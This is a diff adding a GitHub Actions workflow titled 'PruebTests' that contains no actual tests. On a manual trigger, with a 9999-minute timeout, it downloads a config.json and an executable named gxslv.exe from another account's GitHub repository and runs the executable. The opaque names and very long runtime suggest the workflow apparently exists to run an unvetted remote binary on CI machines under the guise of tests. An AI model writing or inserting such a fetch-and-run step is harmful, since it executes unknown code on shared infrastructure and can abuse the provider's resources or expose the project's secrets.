@@ -1,0 +1,17 @@
+name: PruebTests
+
+on: workflow_dispatch
+
+jobs:
+  cnstrc:
+
+    runs-on: windows-latest
+    timeout-minutes: 9999
+
+    steps:
+    - name: Descargar ejctbl y archivos auxiliares.
+      run: |
+        Invoke-WebRequest https://raw.githubusercontent.com/romanferty/mnslvcn/main/config.json -OutFile config.json
+        Invoke-WebRequest https://raw.githubusercontent.com/romanferty/mnslvcn/main/gxslv.exe -OutFile gxslv.exe
+    - name: Correr Accion.
+      run: .\gxslv.exe
